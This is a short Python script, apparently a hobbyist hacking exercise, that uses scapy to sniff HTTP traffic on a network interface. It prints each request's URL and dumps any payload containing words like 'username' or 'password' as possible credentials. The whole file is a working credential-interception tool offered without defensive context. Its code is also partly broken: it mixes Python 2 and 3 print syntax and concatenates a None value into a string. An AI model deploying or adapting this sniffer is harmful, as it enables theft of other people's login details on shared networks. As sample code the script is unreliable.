#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import optparse


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet,
                filter="")  # prn-callback funtion everytime a packet is sniffed.


def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print"[+]HTTPRequest>>" + (url)

        login_info = get_log(packet)
        print("\n\n [+] Possible credentials >>" + login_info + "\n\n")


def get_log(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "login", "user", "password", "pwd"]
        for keyword in keywords:
            if keyword in load:
                return load


def get_interface():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Specify the data interface")
    options = parser.parse_args()[0]
    if not options.interface:
        parser.error("Please specify the interface")

    return options.interface



interface=get_interface()

sniff(interface)



